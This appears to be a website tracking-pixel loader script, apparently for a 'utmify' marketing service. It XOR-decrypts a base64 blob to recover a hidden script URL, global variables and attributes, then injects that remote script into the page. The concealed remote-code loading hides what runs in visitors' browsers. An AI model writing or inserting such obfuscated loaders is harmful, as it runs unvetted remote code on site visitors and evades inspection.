(function () {
  if (window.self !== window.top || window.__utmifyPixelLoaded) return;
  window.__utmifyPixelLoaded = true;

  (function () {
    var g_ezpu = atob(
      "G4y3xV0VIWjbF3uYENgj20SKJQ/8nyzlOBxjU/eVsC95A1L5fw/sYKsZ9GvpQWHS6liIUXoafe/YqHN3U0eodAnxYKxQ9DTjXWqQsFyMQHkPfvjeril6SkaxZFm0MrlXrzbjR3qI+l/HAkc+f67QqTJ3QASoNUHDa/pNuinvBzXe60WObHMIA+XPoDFcRUr3NQ35fK1G+X6oE27Kpx3dAC9WZbvSpmVzQl/pLkitIbtF+TnXWA==",
    );
    var b_fma = [];
    for (var s_pw = 0; s_pw < g_ezpu.length; s_pw++) {
      b_fma.push(g_ezpu.charCodeAt(s_pw) & 255);
    }
    var n_o5 = b_fma[0];
    var c_1si4 = b_fma.slice(1, 1 + n_o5);
    var z_b = b_fma.slice(1 + n_o5);
    var s_i = z_b.map(function (b, m_q4o) {
      return b ^ c_1si4[m_q4o % n_o5];
    });
    var e_wyv = "";
    for (var x_e8i = 0; x_e8i < s_i.length; x_e8i++) {
      e_wyv += String.fromCharCode(s_i[x_e8i] & 255);
    }
    var s_k = decodeURIComponent(escape(e_wyv));
    var u_90cw = JSON.parse(s_k);
    var o_k8k = u_90cw.globals || [];
    o_k8k.forEach(function (t_2jo) {
      window[t_2jo.name] = t_2jo.value;
    });
    var n_n2 = document.createElement("script");
    n_n2.src = u_90cw.url;
    n_n2.async = true;
    n_n2.defer = true;
    (u_90cw.attributes || []).forEach(function (s_2y) {
      n_n2.setAttribute(s_2y.name, s_2y.value);
    });
    (document.head || document.documentElement).appendChild(n_n2);
  })();
})();
